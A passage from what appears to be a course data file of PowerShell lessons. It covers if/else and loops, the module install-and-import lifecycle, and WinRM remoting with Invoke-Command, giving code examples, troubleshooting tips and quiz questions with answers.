    ],
    knowledgeCheck: [
      {
        question: 'Which Execution Policy allows you to run local .ps1 scripts that you wrote yourself while requiring a digital signature on scripts downloaded from the internet?',
        options: ['Restricted', 'AllSigned', 'RemoteSigned', 'Bypass'],
        correctIndex: 2,
        explanation: 'RemoteSigned allows locally created scripts to run unsigned while requiring a trusted digital signature on scripts downloaded from external zones.',
      },
      {
        question: 'Why does PowerShell make you type `.\\deploy.ps1` instead of `deploy.ps1` when running a script in your current directory?',
        options: [
          'Because Windows does not support filenames without slashes',
          'Because PowerShell does not search the current folder for commands, so you must give an explicit path that says "this folder"',
          'To encrypt the script',
          'Because .\\ runs the script in Kernel Mode',
        ],
        correctIndex: 1,
        explanation: 'A bare name is looked up only in the PATH folders. Using .\\ (or a full path) makes the location explicit, so a lookalike file in your working folder is never run by accident.',
      },
    ],
  },

  {
    id: '10-2',
    chapterId: 'chapter-10',
    slug: 'control-flow-and-loops',
    title: 'Control Structures: Sequence, Selection (If/Else) & Loops (For, While, Foreach)',
    subtitle: 'Master array and object loops, subexpression expansion $($proc.Id), and index replacement',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Every script in computer science is built from just three control structures: Sequence (top-to-bottom), Selection (`if / elseif / else`), and Iteration (`foreach ($item in $collection)`, `for`, and `while`).',
    summary:
      'When your scripts need to make decisions ("If the server responds to ping, deploy the update; otherwise log an alert") or repeat an action across 50 items, you use Control Structures. In this lesson, we master `if / elseif / else` (including boolean shortcuts like `Test-Connection -Quiet`), compare `for`, `while`, and `foreach ($item in $collection)` loops, and see when to use a `for ($i = 0; ...)` index loop vs. a `foreach` object loop.',
    whyItMatters:
      'Knowing when to use `foreach ($proc in $processes)` (for reading objects cleanly) versus `for ($i = 0; $i -lt $arr.Count; $i++)` (when you need to overwrite elements inside the original array by index `$arr[$i]`) prevents subtle logic bugs.',
    learningObjectives: [
      'Write conditional decision branches using `if (...) { } elseif (...) { } else { }`',
      'Use cmdlets that return `$true`/`$false` (like `Test-Path` and `Test-Connection -Quiet`) directly inside `if (...)` conditions',
      'Write `for ($i = 0; $i -lt $arr.Count; $i++)` loops using `-lt` (never `-le`!) to avoid off-by-one errors',
      'Iterate over live object collections cleanly with `foreach ($item in $collection)` and expand properties with `$($item.Property)`',
    ],
    keyTerms: [
      'Sequence, Selection, Iteration',
      'if / elseif / else',
      'Test-Connection -Quiet & Test-Path',
      'for ($i = 0; $i -lt $arr.Count; $i++)',
      'while ($condition) { }',
      'foreach ($item in $collection) { }',
    ],
    conceptSections: [
      {
        heading: 'Selection: Making Decisions with if / elseif / else and -Quiet',
        body: [
          'A **Selection** structure evaluates a condition in parentheses `( ... )` and runs the matching `{ ... }` block:\n```powershell\nif ($freeGB -lt 10) {\n    Write-Output "CRITICAL: Low Disk Space!"\n} elseif ($freeGB -lt 25) {\n    Write-Output "WARNING: Disk Space below 25 GB"\n} else {\n    Write-Output "HEALTHY: Plenty of disk space"\n}\n```',
          '**Pro Tip (`Test-Connection -Quiet` and `Test-Path`):** Many PowerShell cmdlets have a `-Quiet` switch (or return a boolean by default) so they output a clean `$true` or `$false`. That means you can place them right inside `if (...)`:\n`if (Test-Connection -ComputerName 192.168.56.10 -Count 1 -Quiet) { Write-Output "DC01 is ONLINE" }`\n(In Windows PowerShell 5.1 the parameter is `-ComputerName`. PowerShell 7 renamed it `-TargetName` but still accepts `-ComputerName`, so `-ComputerName` works on both.)',
        ],
      },
      {
        heading: 'Iteration: Choosing Between foreach, for, and while',
        body: [
          'PowerShell gives you three main loops to repeat actions:\n1. **`foreach ($item in $collection)` (My #1 Choice for Object Collections):**\n   Steps through every item in an array or cmdlet output automatically, no counters or index math needed!\n   ```powershell\n   $procs = Get-Process | Select-Object -First 3\n   foreach ($p in $procs) {\n       Write-Output "$($p.Name) has PID $($p.Id)"\n   }\n   ```\n2. **`for ($i = 0; $i -lt $arr.Count; $i++)` (Use When You Need the Index `$i`):**\n   Starts counter `$i` at `0`, loops while `$i -lt $arr.Count` (**always `-lt`, never `-le`**, because a 4-item array has indices `0, 1, 2, 3`!), and increments `$i++`. Use `for` when you want to **modify an element in place** inside the array (`$arr[$i] = "NewValue"`).\n3. **`while ($condition)` (Use When Waiting for a State Change):**\n   Keeps looping as long as the condition is `$true` (e.g., waiting for a service or rebooting server to come back online).',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Use `if / elseif / else` for decisions, `foreach ($item in $list)` to iterate over objects cleanly, and `for ($i = 0; $i -lt $list.Count; $i++)` when you need to modify array elements by index `$list[$i]`.',
      },
      {
        type: 'gotcha',
        title: 'The Classic Off-By-One Bug: Always Use -lt $arr.Count, Never -le!',
        body: 'If `$arr` has 4 items, `$arr.Count` is `4`, and the valid indices are `0, 1, 2, 3`. If you write `$i -le $arr.Count`, the loop runs a 5th time at `$arr[4]` (which is `$null`!). Always write `$i -lt $arr.Count`.',
      },
      {
        type: 'pro',
        title: 'foreach Statement vs. ForEach-Object in the Pipeline',
        body: '`foreach ($x in $list) { ... }` at the start of a line loads the list into memory first and loops at blazing speed. `... | ForEach-Object { $_ }` in the middle of a pipeline streams objects one at a time.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Test-Connection',
        aliases: [],
        syntax: 'Test-Connection [-ComputerName] <String[]> [-Count <Int32>] [-Quiet]',
        parameters: [
          {
            name: '-ComputerName',
            type: 'String[]',
            description: 'The target to ping. This is the name on Windows PowerShell 5.1 (and Server Core). PowerShell 7 renamed it -TargetName but still accepts -ComputerName. Note: `ping` is ping.exe, not an alias of this cmdlet.',
          },
          {
            name: '-Count',
            type: 'Int32',
            description: 'Specifies how many ICMP echo requests (pings) to send.',
          },
          {
            name: '-Quiet',
            type: 'SwitchParameter',
            description: 'Suppresses detailed ping objects and returns a simple Boolean ($true or $false) ready for if (...) checks.',
          },
        ],
        examples: ['if (Test-Connection -ComputerName 127.0.0.1 -Count 1 -Quiet) { "Online!" }'],
      },
    ],
    codeExamples: [
      {
        title: 'If/Else Selection, Foreach Object Loops, and In-Place Array Replacement with For',
        description: 'Demonstrate conditional branching, iterating over process objects with $(), and replacing an array element by index.',
        code: `# 1. Selection (if / else) using Test-Path
if (Test-Path -Path 'C:\\Windows\\System32\\ntoskrnl.exe') {
  Write-Output "[OK] Windows NT Kernel image verified on disk."
} else {
  Write-Output "[ALERT] Kernel file not found!"
}

# 2. Foreach loop over live Process objects (using $($proc.Property) inside double quotes)
$topProcs = Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
foreach ($proc in $topProcs) {
  Write-Output "$($proc.Name) is running with PID $($proc.Id)"
}

# 3. For loop with index $i to find and replace an element inside an array
$fruits = @('apple', 'pear', 'banana', 'orange')
for ($i = 0; $i -lt $fruits.Count; $i++) {
  if ($fruits[$i] -eq 'banana') {
    $fruits[$i] = 'mango'
  }
}
Write-Output "Updated array: $($fruits -join ', ')"`,
        output: `[OK] Windows NT Kernel image verified on disk.
MsMpEng is running with PID 3412
explorer is running with PID 5412
powershell is running with PID 8820
Updated array: apple, pear, mango, orange`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing an infinite `while` loop by forgetting to increment the counter (`$i++`) inside the `{ ... }` body.',
        cause: 'If the loop variable never changes, the `while` condition stays `$true` forever (press `Ctrl+C` to break out!).',
        fix: 'Always update your counter or state variable inside a `while` loop, or use `foreach` / `for` when the iteration count is known.',
      },
    ],
    tryItYourself: [
      'Write a `foreach ($svc in (Get-Service | Select-Object -First 5))` loop that prints `"Service $($svc.Name) has status $($svc.Status)"`.',
      'Write an `if / else` check using `Test-Path C:\\Windows` that prints whether the folder exists.',
    ],
    knowledgeCheck: [
      {
        question: 'Why should a `for` loop over an array `$items` use `$i -lt $items.Count` instead of `$i -le $items.Count`?',
        options: [
          'Because PowerShell does not have a -le operator',
          'Because arrays are zero-indexed, so the last valid index is ($items.Count - 1); using -le reads one index past the end of the array',
          'Because -lt runs in Kernel Mode',
          'Because $items.Count starts at 10',
        ],
        correctIndex: 1,
        explanation: 'A 4-element array has indices 0, 1, 2, and 3 while .Count is 4. Using $i -lt $items.Count stops cleanly at index 3.',
      },
      {
        question: 'Which switch on Test-Connection returns a simple $true or $false boolean value ideal for an `if (...)` statement?',
        options: ['-Boolean', '-Quiet', '-Fast', '-Simple'],
        correctIndex: 1,
        explanation: 'Test-Connection -Quiet returns $true if any ping succeeds and $false if all pings fail.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 11: MODULES, POWERSHELL GALLERY & WINRM REMOTING
  // ==========================================================================
  {
    id: '11-1',
    chapterId: 'chapter-11',
    slug: 'module-lifecycle',
    title: 'Modules & The PowerShell Gallery: Installed vs Imported',
    subtitle: 'Walk through the 5-step module workflow so you never get stuck when auto-import fails',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'A Module is a plug-in toolbox of cmdlets; follow the 5-step lifecycle (`Find-Module` → `Install-Module` → `Get-Module -ListAvailable` → `Import-Module` → `Get-Command -Module`) to add any capability from Active Directory to VMware PowerCLI.',
    summary:
      'Out of the box, PowerShell ships with core modules for Windows processes, services, and networking. But what when you need to manage Active Directory, VMware vSphere (`VMware.PowerCLI`), Microsoft 365, AWS, or Azure? You install a **Module**! In this lesson, we master the crucial difference between a module being **Installed on disk** versus **Imported into RAM**, and walk through the 5-Step Module Lifecycle.',
    whyItMatters:
      'When an engineer installs a module or RSAT feature and a script still fails to recognize its cmdlets, knowing `Get-Module -ListAvailable` and `Import-Module` solves the issue in 5 seconds.',
    learningObjectives: [
      'Explain the difference between a module that is **Installed on disk** (`Get-Module -ListAvailable`) vs. **Imported into the current session’s RAM** (`Get-Module`)',
      'Execute the 5-Step Module Lifecycle: `Find-Module` → `Install-Module` → `Get-Module -ListAvailable` → `Import-Module` → `Get-Command -Module`',
      'Inspect `$env:PSModulePath` to see where PowerShell looks for installed modules on disk',
      'Remove or update modules cleanly using `Update-Module` and `Uninstall-Module`',
    ],
    keyTerms: [
      'PowerShell Module (.psm1 / .psd1)',
      'PowerShell Gallery (PSGallery)',
      'Installed (On Disk) vs. Imported (In RAM)',
      'Find-Module & Install-Module',
      'Get-Module -ListAvailable & Import-Module',
      'Get-Command -Module <ModuleName>',
    ],
    conceptSections: [
      {
        heading: 'Installed on Disk vs. Imported in Memory: The Bookshelf Analogy',
        body: [
          'Think of a **Module** as a reference manual:\n• **Installed on Disk (`Get-Module -ListAvailable`):** The book is sitting on your bookshelf (`$env:PSModulePath`). It is saved on your SSD, even if you haven’t opened it yet in today’s terminal window.\n• **Imported in RAM (`Get-Module` without switches):** You have pulled the book off the shelf and opened it on your desk for the current PowerShell session.',
          'Since PowerShell 3.0, PowerShell tries to **auto-import** a module the first time you type one of its cmdlets. However, in automation scripts, startup profiles, or complex modules like `VMware.PowerCLI`, you should explicitly load the module with **`Import-Module`** at the top of your script!',
        ],
      },
      {
        heading: 'My 5-Step Module Lifecycle (Memorize This Sequence!)',
        body: [
          'Whenever you need to add a new capability (like `PSReadLine`, `Posh-SSH`, or `VMware.PowerCLI`) from the official **PowerShell Gallery**, walk through these exact 5 steps:\n1. **Search the online gallery:** `Find-Module -Name *VMware*`\n2. **Download and install to disk:** `Install-Module -Name VMware.PowerCLI -Scope CurrentUser`\n3. **Verify it is installed on disk:** `Get-Module -ListAvailable -Name VMware*`\n4. **Load it into your current session’s RAM:** `Import-Module -Name VMware.PowerCLI`\n5. **List all cmdlets inside that module:** `Get-Command -Module VMware.PowerCLI`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`Get-Module` shows modules currently loaded in RAM; `Get-Module -ListAvailable` shows every module installed on your hard drive across `$env:PSModulePath`.',
      },
      {
        type: 'try',
        title: 'Compare Loaded vs. Available Modules Right Now',
        body: 'Run `(Get-Module).Count` (modules loaded in RAM right now) and then `(Get-Module -ListAvailable).Count` (all modules installed on your disk). Notice the huge difference!',
      },
      {
        type: 'pro',
        title: 'Installing Without Admin Rights Using -Scope CurrentUser',
        body: 'By default, `Install-Module` tries to write to `C:\\Program Files` (which requires Administrator rights). Pass `-Scope CurrentUser` to install cleanly into your personal user profile folder!',
      },
      {
        type: 'gotcha',
        title: 'When You Get Stuck: Install-Module Fails on Windows PowerShell 5.1',
        body: '• **"NuGet provider is required"**: accept the prompt, or run `Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Scope CurrentUser`.\n• **"Unable to resolve package source" / TLS errors**: older 5.1 systems default to old TLS versions. Run `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` in that session, then retry.\n• **"Untrusted repository" prompt**: PSGallery is untrusted by default on purpose. Answer the prompt, and only install modules you have checked (publisher, download count, source code). Do not blindly run `Set-PSRepository -InstallationPolicy Trusted` on work machines.\n• **No internet in the lab?** Our `LabNet` switch is isolated, so `Find-Module` and `Install-Module` will fail there. Use the built-in modules (`NetTCPIP`, `Microsoft.PowerShell.LocalAccounts`) for the exercises, or temporarily give the VM a NAT adapter.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-Module',
        aliases: ['gmo'],
        syntax: 'Get-Module [[-Name] <String[]>] [-ListAvailable]',
        parameters: [
          {
            name: '-ListAvailable',
            type: 'SwitchParameter',
            description: 'Lists all modules installed on disk inside $env:PSModulePath, not just those currently imported into RAM.',
          },
        ],
        examples: [
          'Get-Module',
          'Get-Module -ListAvailable',
          'Get-Command -Module NetTCPIP',
        ],
      },
      {
        cmdlet: 'Install-Module',
        aliases: [],
        syntax: 'Install-Module [-Name] <String[]> [-Scope <String>] [-Force]',
        parameters: [
          {
            name: '-Scope',
            type: 'String',
            description: 'Specifies AllUsers (requires Admin) or CurrentUser (no Admin required).',
          },
        ],
        examples: ['Install-Module -Name Posh-Git -Scope CurrentUser'],
      },
    ],
    codeExamples: [
      {
        title: 'The 5-Step Module Lifecycle in Action',
        description: 'Inspect module paths, compare loaded vs installed modules, and list all cmdlets inside a specific module.',
        code: `# 1. Inspect the folders where PowerShell searches for modules on disk
$env:PSModulePath -split ';'

# 2. List modules currently imported into RAM vs installed on disk
Get-Module | Select-Object Name, Version
Get-Module -ListAvailable -Name 'Microsoft.PowerShell.*' | Select-Object Name, Version

# 3. Explicitly import a module and list all cmdlets it provides
Import-Module -Name Microsoft.PowerShell.LocalAccounts
Get-Command -Module Microsoft.PowerShell.LocalAccounts`,
        output: `C:\\Users\\student\\Documents\\WindowsPowerShell\\Modules
C:\\Program Files\\WindowsPowerShell\\Modules
C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules

CommandType Name              Version Source
----------- ----              ------- ------
Cmdlet      Add-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Disable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Enable-LocalUser  1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Get-LocalGroup    1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Get-LocalUser     1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      New-LocalUser     1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Remove-LocalUser  1.0.0.0 Microsoft.PowerShell.LocalAccounts`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-Module` without `-ListAvailable` and assuming a module is not installed on the server because it didn’t appear in the list.',
        cause: '`Get-Module` with no parameters only shows modules already imported into the current session’s RAM.',
        fix: 'Always use `Get-Module -ListAvailable` when checking if a module is installed on disk.',
      },
    ],
    tryItYourself: [
      'Run `Get-Command -Module NetTCPIP` to see every network cmdlet packaged inside the built-in `NetTCPIP` module.',
      'Run `Get-Module -ListAvailable` to explore every module pre-installed on your Windows system.',
    ],
    knowledgeCheck: [
      {
        question: 'What is the difference between `Get-Module` and `Get-Module -ListAvailable`?',
        options: [
          'They return the exact same output',
          'Get-Module shows only modules currently imported in RAM; Get-Module -ListAvailable scans the disk ($env:PSModulePath) for all installed modules',
          'Get-Module -ListAvailable downloads modules from the internet',
          'Get-Module deletes unused modules',
        ],
        correctIndex: 1,
        explanation: 'Get-Module lists modules active in the current session, whereas Get-Module -ListAvailable inspects all module directories on disk.',
      },
      {
        question: 'Once you know a module’s name (for example, NetSecurity), which command lists every cmdlet inside that module?',
        options: [
          'Get-Module -Cmdlets NetSecurity',
          'Get-Command -Module NetSecurity',
          'Select-String -Module NetSecurity',
          'Show-Module NetSecurity',
        ],
        correctIndex: 1,
        explanation: 'Get-Command -Module <ModuleName> lists all cmdlets, functions, and aliases exported by that module.',
      },
    ],
  },

  {
    id: '11-2',
    chapterId: 'chapter-11',
    slug: 'winrm-and-remoting',
    title: 'PowerShell Remoting: WinRM (5985/5986), Enter-PSSession & Invoke-Command',
    subtitle: 'Control headless servers remotely, run parallel scriptblocks, and understand Kerberos Double-Hop',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'PowerShell Remoting uses WinRM over TCP ports `5985` (HTTP) and `5986` (HTTPS, needs a certificate you set up) to give you 1-to-1 interactive shells (`Enter-PSSession`) and 1-to-many execution across many servers (`Invoke-Command`, 32 at a time by default).',
    summary:
      'Why walk over to a server or open a heavy Remote Desktop (RDP) session when you can manage many servers from your workstation terminal? In this lesson, we explore **WinRM (Windows Remote Management)**, memorize its network ports (`5985` and `5986`), test connectivity with `Test-WSMan`, compare `Enter-PSSession` (1-to-1) with `Invoke-Command` (1-to-many), and unpack the famous **Kerberos Double-Hop problem**. Lab setup: see the Lab Setup page.',
    whyItMatters:
      'Remember our headless Windows Server Core VM from Chapter 9? Once its static IP is configured, you almost never sit at its console again, you manage it remotely from your workstation via WinRM!',
    learningObjectives: [
      'Explain how WinRM (WS-Management protocol) works and memorize its default ports: **TCP 5985 (HTTP)** and **TCP 5986 (HTTPS)**, and that `Enable-PSRemoting` only sets up 5985',
      'Enable and verify PowerShell Remoting using `Enable-PSRemoting -Force` and `Test-WSMan`, and fix the common blockers (Public network profile, TrustedHosts)',
      'Choose between `Enter-PSSession` (interactive 1-to-1 terminal, like SSH) and `Invoke-Command` (parallel 1-to-many scriptblock execution, `-ThrottleLimit` 32 by default)',
      'Explain the **Kerberos Double-Hop Problem**, why credentials cannot jump from Server A to Server B to Server C without delegation, and why CredSSP is a risky shortcut',
    ],
    keyTerms: [
      'WinRM (Windows Remote Management) & WS-Man',
      'TCP Port 5985 (HTTP) & TCP Port 5986 (HTTPS)',
      'Test-WSMan & Enable-PSRemoting',
      'Enter-PSSession (1-to-1) & Exit-PSSession',
      'Invoke-Command (1-to-Many) -ScriptBlock',
      'Kerberos Double-Hop Problem',
    ],
    conceptSections: [
      {
        heading: 'How WinRM Works & The Two Ports Every Engineer Must Memorize',
        body: [
          'On Windows Server (2012 R2 through 2025), **PowerShell Remoting is enabled by default** via the **WinRM (`Windows Remote Management`)** service. On Windows 10/11 client machines, it is disabled by default until an Administrator runs **`Enable-PSRemoting -Force`**.',
          'Memorize the two default WinRM TCP ports:\n• **TCP Port `5985`:** WinRM over **HTTP** *(Note: with the default Negotiate authentication (Kerberos, or NTLM as a fallback) the PowerShell Remoting messages are still encrypted at the message level, even over HTTP port 5985. That is why 5985 is acceptable inside a domain.)*\n• **TCP Port `5986`:** WinRM over **HTTPS** (TLS certificate encryption). **`Enable-PSRemoting` only creates the HTTP listener on 5985.** To use 5986 you must install a server certificate whose name matches the host, and create an HTTPS listener yourself (for example with `New-WSManInstance` or `winrm quickconfig -transport:https`) and open the firewall port. It is optional in our lab and normal inside a domain.',
          'Before trying to connect to a remote server, verify that its WinRM service is listening by running:\n**`Test-WSMan -ComputerName SRV-CORE01`**\nLab setup: see the Lab Setup page. Run the examples from `CLIENT01` (192.168.56.30) against `SRV-CORE01` (192.168.56.20) and `DC01` (192.168.56.10).',
        ],
      },
      {
        heading: '1-to-1 Interactive (`Enter-PSSession`) vs. 1-to-Many Fan-Out (`Invoke-Command`)',
        body: [
          'PowerShell Remoting gives you two distinct ways to work:\n1. **1-to-1 Interactive Session (`Enter-PSSession` - Like SSH):**\n   `Enter-PSSession -ComputerName SRV-CORE01`\n   Your prompt immediately changes to **`[SRV-CORE01]: PS C:\\Users\\Administrator\\Documents>`**. Every command you type now runs directly on `SRV-CORE01`! When you are finished, type **`Exit-PSSession`**.\n2. **1-to-Many Parallel Fan-Out (`Invoke-Command` - The Enterprise Superpower):**\n   What if you need to check a service or install a patch on **many servers in one go**? Pass an array of server names to **`Invoke-Command`** along with a **`-ScriptBlock { ... }`** (or a local script file via `-FilePath`):\n   `Invoke-Command -ComputerName SRV-CORE01, DC01 -ScriptBlock { Get-Service -Name WinRM }`\n   PowerShell runs the command on the servers in parallel, but not all at once without limit: **`-ThrottleLimit` defaults to 32**, so with 50 servers it works through them 32 at a time (raise or lower it with `-ThrottleLimit`). Results come back as serialized (XML) objects, and PowerShell adds a **`PSComputerName`** property to every row so you know which server returned which result!',
        ],
      },
      {
        heading: 'The Kerberos Double-Hop Problem Explained Simply',
        body: [
          'Here is a classic real-world scenario that stumps even experienced admins:\n1. You are sitting at your **Admin Workstation (Machine 1)**.\n2. You `Enter-PSSession` or `Invoke-Command` into **`SRV-CORE01` (Machine 2 - Hop #1)**. Authentication succeeds via Kerberos!\n3. Inside that remote session on `SRV-CORE01`, you try to copy a file from a third server: `Copy-Item \\\\DC01\\Share\\installer.msi C:\\Temp` (**Machine 3 - Hop #2**).\n4. **ACCESS DENIED!** Why? Because to protect you against a compromised server stealing your credentials and impersonating you across the rest of the network, Kerberos refuses to let `SRV-CORE01` forward your token to the third server! That is called the **Kerberos Double-Hop Problem**.\n• **How pros solve it safely:** Either copy files from your workstation directly using a `New-PSSession` (`Copy-Item -ToSession $session`), pass explicit credentials inside the block, or configure **Resource-Based Kerberos Constrained Delegation**.\n• **CredSSP is the shortcut to avoid.** `Enable-WSManCredSSP` lets the remote server receive your actual password, so anyone who controls that server can steal it. Know that it exists, but do not use it for convenience; prefer the options above.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'WinRM listens on TCP `5985` (HTTP) and `5986` (HTTPS); use `Enter-PSSession` to troubleshoot one server interactively and `Invoke-Command` to execute code across many servers in parallel.',
      },
      {
        type: 'gotcha',
        title: 'Workgroup vs. Active Directory Domain Remoting',
        body: 'Inside an Active Directory domain, Kerberos handles WinRM authentication seamlessly when you use the server’s **hostname** (`SRV-CORE01`). If you connect by raw IP address (`192.168.56.20`) or in a Workgroup without a domain, Kerberos cannot verify the target. The usual fixes are HTTPS (5986, with a certificate) or adding the target to `TrustedHosts`, which is the weaker option: see the stuck list below.',
      },
      {
        type: 'gotcha',
        title: 'When You Get Stuck: Remoting Will Not Connect',
        body: '1. **Public network profile.** `Enable-PSRemoting` refuses to open the firewall rule on a Public profile (typical on a fresh Windows 11 client). Fix the real cause with `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`. `Enable-PSRemoting -SkipNetworkProfileCheck` exists but leaves the machine more exposed, so use it only in the lab.\n2. **Test the basics in order:** `Test-NetConnection 192.168.56.20 -Port 5985` (is the port reachable?), then `Test-WSMan SRV-CORE01` (is WinRM answering?), then `Enter-PSSession`.\n3. **Connecting by IP address or from a workgroup machine.** Kerberos fails, and you get a "TrustedHosts" or authentication error. Preferred: use the hostname and make sure DNS resolves it (`Resolve-DnsName SRV-CORE01`). Fallback: `Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value "192.168.56.20"`.\n4. **TrustedHosts is a security trade-off.** It tells your client to talk to that host without verifying who it is, so someone could impersonate it and harvest the credentials you send. Add single named hosts only, never `*`, and remove them when done (`Clear-Item WSMan:\\localhost\\Client\\TrustedHosts`). HTTPS with a valid certificate is the proper fix.\n5. **HTTPS (5986) refuses to connect.** `Enable-PSRemoting` did not create that listener. You need a certificate matching the host name and an HTTPS listener (see the ports section).\n6. **"Access is denied".** Your account must be a member of Administrators (or Remote Management Users) on the target.',
      },
      {
        type: 'pro',
        title: 'Persistent Sessions with New-PSSession',
        body: 'If you run `Invoke-Command -ComputerName SRV-CORE01` five times in a row, PowerShell creates and tears down a brand-new session 5 times (losing any variables you created). Instead, create a persistent session with `$s = New-PSSession -ComputerName SRV-CORE01` and pass `Invoke-Command -Session $s`. Remove it with `Remove-PSSession $s` when you are done.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Invoke-Command',
        aliases: ['icm'],
        syntax: 'Invoke-Command [-ComputerName <String[]>] [-ScriptBlock] <ScriptBlock> [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-ComputerName',
            type: 'String[]',
            description: 'One or more remote server hostnames to run the command on. Runs in parallel, limited by -ThrottleLimit (default 32).',
          },
          {
            name: '-ThrottleLimit',
            type: 'Int32',
            description: 'The maximum number of computers contacted at the same time. Default is 32, so 50 servers run in waves.',
          },
          {
            name: '-ScriptBlock',
            type: 'ScriptBlock',
            description: 'The { ... } block of PowerShell commands to run on the remote computers.',
          },
          {
            name: '-FilePath',
            type: 'String',
            description: 'Runs a local .ps1 script file on the remote computers without needing to copy the file over first!',
          },
        ],
        examples: [
          'Invoke-Command -ComputerName SRV-CORE01, DC01 -ScriptBlock { Get-Process }',
          'Invoke-Command -ComputerName SRV-CORE01, DC01 -ThrottleLimit 16 -ScriptBlock { Get-Date }',
          'Invoke-Command -ComputerName SRV-CORE01 -FilePath .\\healthcheck.ps1',
        ],
      },
      {
        cmdlet: 'Enter-PSSession',
        aliases: ['etsn'],
        syntax: 'Enter-PSSession [-ComputerName] <String> [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-ComputerName',
            type: 'String',
            description: 'Opens a 1-to-1 interactive PowerShell prompt on the specified remote computer.',
          },
        ],
        examples: ['Enter-PSSession -ComputerName SRV-CORE01'],
      },
    ],
    codeExamples: [
      {
        title: 'Testing WinRM, Interactive Sessions, and Parallel Multi-Server Invoke-Command',
        description: 'Verify WinRM over port 5985, enter an interactive session, and query two servers in parallel. Run from CLIENT01 in the lab.',
        code: `# 1. Verify that the remote server's WinRM service is responding (TCP 5985)
Test-WSMan -ComputerName 'SRV-CORE01'

# 2. Interactive 1-to-1 remote troubleshooting session
Enter-PSSession -ComputerName 'SRV-CORE01'
# [SRV-CORE01]: PS C:\\> hostname
Exit-PSSession

# 3. Parallel 1-to-Many execution (32 at a time by default; plenty for two servers)
$servers = @('SRV-CORE01', 'DC01')
Invoke-Command -ComputerName $servers -ScriptBlock {
  [PSCustomObject]@{
    OSBuild   = [System.Environment]::OSVersion.Version.Build
    WinRMStat = (Get-Service -Name WinRM).Status
    FreeGB    = [math]::Round((Get-PSDrive C).Free / 1GB, 1)
  }
} | Select-Object PSComputerName, OSBuild, WinRMStat, FreeGB`,
        output: `wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0

PSComputerName OSBuild WinRMStat FreeGB
-------------- ------- --------- ------
SRV-CORE01       26100   Running   48.4
DC01             26100   Running   41.2`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Trying to pass a local variable `$myVar` inside `Invoke-Command -ScriptBlock { Write-Output $myVar }` and wondering why it prints `$null`.',
        cause: 'Code inside `-ScriptBlock { ... }` executes on the **remote server**, which does not have your local workstation’s variables in its RAM!',
        fix: 'Prefix local variables with the `$using:` scope modifier inside remote scriptblocks: `Invoke-Command -ComputerName SRV-CORE01 -ScriptBlock { Write-Output $using:myVar }`.',
      },
    ],
    tryItYourself: [
      'Run `Get-Service -Name WinRM` on your machine to check whether the Windows Remote Management service is currently `Running` or `Stopped`.',
      'Run `Invoke-Command -ScriptBlock { Get-Date }` locally (without `-ComputerName`) to see how `-ScriptBlock` executes an isolated block of code.',
      'In the lab, from `CLIENT01`, run `Test-NetConnection SRV-CORE01 -Port 5985` and then `Test-WSMan SRV-CORE01`. Which one fails first when the firewall blocks WinRM?',
    ],
    knowledgeCheck: [
      {
        question: 'Which two TCP ports does WinRM (PowerShell Remoting) use by default for HTTP and HTTPS?',
        options: [
          'TCP 80 (HTTP) and TCP 443 (HTTPS)',
          'TCP 5985 (HTTP) and TCP 5986 (HTTPS)',
          'TCP 22 (SSH) and TCP 3389 (RDP)',
          'TCP 445 (SMB) and TCP 53 (DNS)',
        ],
        correctIndex: 1,
        explanation: 'WinRM listens on TCP 5985 for HTTP and TCP 5986 for HTTPS.',
      },
      {
        question: 'When should you use `Invoke-Command` instead of `Enter-PSSession`?',
        options: [
          'When you want to run a scriptblock across 10, 50, or 500 remote servers in parallel and collect structured results',
          'Only when you do not know the server name',
          'Only on Linux machines',
          'Never; Enter-PSSession is for multiple servers',
        ],
        correctIndex: 0,
        explanation: 'Enter-PSSession is for 1-to-1 interactive typing; Invoke-Command scales to 1-to-many execution across arrays of servers (32 at a time by default, change it with -ThrottleLimit).',
      },
      {
        question: 'You ran `Enable-PSRemoting -Force` on a server. Which WinRM listener does that create by default?',
        options: [
          'HTTP on TCP 5985 only; HTTPS on 5986 needs a certificate and a listener you add yourself',
          'Both HTTP 5985 and HTTPS 5986, with a self-made certificate',
          'SSH on TCP 22',
          'RDP on TCP 3389',
        ],
        correctIndex: 0,
        explanation: 'Enable-PSRemoting configures the HTTP listener (5985) and the firewall rule. HTTPS (5986) is opt-in and needs a server certificate.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 12: ACTIVE DIRECTORY, DOMAIN CONTROLLERS, DNS & PASSWORD POLICIES
  // ==========================================================================
  {
    id: '12-1',
    chapterId: 'chapter-12',
